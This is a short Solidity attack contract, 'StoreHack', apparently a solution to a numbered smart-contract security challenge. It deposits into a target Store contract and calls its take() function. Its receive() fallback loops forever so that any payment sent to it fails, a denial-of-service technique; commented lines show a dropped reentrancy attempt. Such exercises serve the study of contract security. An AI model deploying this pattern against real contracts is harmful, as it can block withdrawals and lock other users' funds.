//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

// import "forge-std/console2.sol";
import "src/01_Store.sol";

contract StoreHack {
    Store _store;

    // receive() external payable {}
    bool once = true;

    // fallback function
    receive() external payable {
        // console2.log("fb");
        // _store.take();

        while (true) {}
        // require(false);
    }

    constructor(address storeAddress) {
        _store = Store(storeAddress);
    }

    function call_store(uint256 amount) public {
        // console2.log("[StoreHack] entering, _store", address(_store));
        // Store _store = Store(storeAddress);
        // console2.log("[StoreHack] Store is on", address(_store));
        _store.store{value: amount}();
    }

    function call_take() public {
        _store.take();
    }
}
